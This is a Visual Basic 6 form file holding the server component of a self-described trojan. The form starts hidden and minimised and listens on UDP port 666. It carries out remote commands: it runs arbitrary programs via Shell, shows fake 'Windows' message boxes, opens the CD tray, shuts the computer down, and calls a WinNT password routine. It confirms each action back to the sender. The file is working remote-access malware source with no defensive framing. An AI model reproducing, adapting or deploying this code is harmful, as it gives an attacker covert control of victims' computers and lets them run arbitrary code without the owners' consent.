VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form frmServer 
   Appearance      =   0  'Flat
   BackColor       =   &H80000005&
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Server"
   ClientHeight    =   660
   ClientLeft      =   45
   ClientTop       =   330
   ClientWidth     =   1140
   Icon            =   "server.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   660
   ScaleWidth      =   1140
   StartUpPosition =   3  'Windows Default
   Visible         =   0   'False
   WindowState     =   1  'Minimized
   Begin MSWinsockLib.Winsock wskServer 
      Left            =   360
      Top             =   120
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      Protocol        =   1
      LocalPort       =   666
   End
End
Attribute VB_Name = "frmServer"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Form_Load()
    With wskServer
     .Protocol = sckUDPProtocol
     .LocalPort = 666
     .Bind
    End With
End Sub

Private Sub wskServer_DataArrival(ByVal bytesTotal As Long)

Dim tipo As String
Dim mensaje As String

On Error GoTo err
    wskServer.GetData tipo
    wskServer.GetData mensaje
    wskServer.RemoteHost = wskServer.RemoteHostIP
    
    'Opciones del trojan
    
    Select Case tipo
    
        Case "Mensaje"
            Message = MsgBox(mensaje, 64, "Windows")
            wskServer.SendData "Mensaje enviado..."
        Case "AbrirCD"
            CDOpen
            wskServer.SendData "CD-ROM abierto..."
        Case "AbrirExe"
            Dim ExeVal
            ExeVal = Shell(mensaje, 1)
            wskServer.SendData "Programa abierto..."
        Case "CerrarCD"
            CDClose
            wskServer.SendData "CD-ROM cerrado..."
        Case "ClaveRed"
            ClaveRed
            wskServer.SendData "Clave WinNT ingresada..."
        Case "ApagarPC"
            ShutDown
            wskServer.SendData "PC apagada..."
    End Select
    Exit Sub
err:
    Exit Sub
End Sub

